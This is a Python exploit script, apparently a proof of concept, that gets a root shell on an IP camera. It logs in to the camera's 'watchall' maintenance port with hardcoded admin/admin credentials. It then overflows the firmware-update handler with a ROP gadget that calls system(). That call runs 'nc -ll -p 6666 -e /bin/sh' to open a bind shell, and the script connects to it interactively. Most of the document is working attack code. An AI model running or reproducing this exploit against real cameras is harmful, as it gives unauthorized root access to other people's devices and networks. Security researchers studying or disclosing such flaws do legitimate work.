#!/usr/bin/env python3

# The watchall executable is responsable to start all the main binaries of the camera.
# Furthermore, it open the "maintainance" (a.k.a. backdoor) port tcp/20203 which
# permits to obtain information from the camera, restore the factory
# configuration, reboot the camera or upgrade the firmware. All these operations
# require to login into the camera using the hardcoded credentials "admin","admin"
# using the same "maintenance" port. 

# Watchall exists in different versions (at least 3): in two of them is very
# easy to have a root shell using only gadgets present in the binary itself. The
# last one require gadgets from uClibc (exploit not implemented here)

# The exploit is based on a buffer overflow on TransAndUpdateHandle() (0xabec)
# in the watchall binary. The buffer overflow is due to the unchecked length on
# the received update package at 0xae78.
#
# The watchall binary is compiled with NX protection, to bypass it, call
# system() and open a remote shell, it is possible to use the gadget at 0xce20:
#       cpy r0,sp
#       bl system

# ############################################################################
# WARNING! The exploit crashes watchall daemon, so when you have finished to
# explore the camera please restart it through the web interface.
##############################################################################

# ############################################################################
# !!!WARNING!!! Using the wrong exploit version crashes watchall without
# open a shell and require a camera reboot before retry with another one.
##############################################################################

# Watchall versions: sha1sum, version, notes
# ca4a38bf7c1e49cd12c125ac3d730cfea897c2b0  1,  Binary from my camera
# 4d70b63a956347a4c39fb43889de4d29005a8bab  2,  Other version easy exploitable
# 5959ead28bb0aa7134a3763512331871ddd704b2  3,  Require gadgets from uClibc

import argparse
from pwn import *
import more_itertools

parser = argparse.ArgumentParser()
parser.add_argument("address", help="Camera IP address/hostname", type=str)
parser.add_argument("--port", help="Watchall listening port (default 20203)", default=20203, type=int)
parser.add_argument("--user", help="Username (default admin)", default="admin", type=str)
parser.add_argument("--password", help="Password (default admin)", default="admin", type=str)
parser.add_argument("--version", help="Watchall version (see the code for details)", type=int, required=True, choices=[1,2])

args = parser.parse_args()
user = args.user.encode()
password = args.password.encode()
bin_version = args.version

# Packet format: MAGIC | CMD_MAJOR_CODE | PAD | DATA_LEN | DATA
magic = b'INFO'
pad = b'\x00' * 4
pc_offset = 131080
system_str = b"nc -ll -p 6666 -e /bin/sh &\x00"

# Connect to the camera
conn = remote(args.address, args.port)

# Prepare login packet and 
payload = user + (32-len(user)) * b'\x00' + password + (32-len(password)) * b'\x00'
login_pkt = magic + b'\x00\x00\x00\x01' + pad + len(payload).to_bytes(4, "big") + payload 
print("Try to login into the HankBatchUpdateServer... ", end="")
conn.send(login_pkt)
reply = conn.recv()
if reply != b"INF\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x08":
    print("ERROR!")
    exit(1)
else:
    print("OK")

# Start the firmware update process
payload = b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
init_update_pkt = magic + b"\x00\x00\x00\x05" + pad + len(payload).to_bytes(4, "big") + payload
print("Start update procedure... ", end="")
conn.send(init_update_pkt)
reply = conn.recv()
if reply != b"\x00\x00\x00\x00\x00\x00\x00\x00":
    print("ERROR!")
    exit(1)
else:
    print("OK")

# Send the length of the "firmware" that will be sent
if bin_version == 1:
    gadget_addr = b'\x20\xce\x00\x00'
elif bin_version == 2:
    gadget_addr = b'\xdc\x22\x01\x00'

exploit_payload =  b'A' * pc_offset + gadget_addr + system_str
partition_descriptor = b"MainAppPkg,1,0,?,?,V1.00.00&"
exploit = partition_descriptor + exploit_payload
exploit_size_pkt = (len(exploit)).to_bytes(4, "big")
print('Send "update" length... ', end="")
conn.send(exploit_size_pkt)
reply = conn.recv()
if reply != b"INF\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00 ":
    print("ERROR!")
    exit(1)
else:
    print("OK")

# Send the exploit packet (in more chunks due to the big size of the exploit)
print('Send exploit... ')
for i in [bytes(c) for c in more_itertools.divide(5, exploit)]:
    conn.send(i)
    sleep(1)
conn.close()

# Try to open the shell
print(f'Wait 10 seconds than connect to {args.address}:6666... ')
print("!!!WARNING!!! The shell opened on port tcp/6666 could crash, please use `passwd`"
    "command to tempoarly change the root password and login through telnet port to have a stable shell")
print("!!!WARNING!!! The exploit crashes watchall daemon, so when you have finished to"
    "explore the camera please restart it through the web interface.")
sleep(10)
nc_shell = remote(args.address, 6666)
nc_shell.interactive()
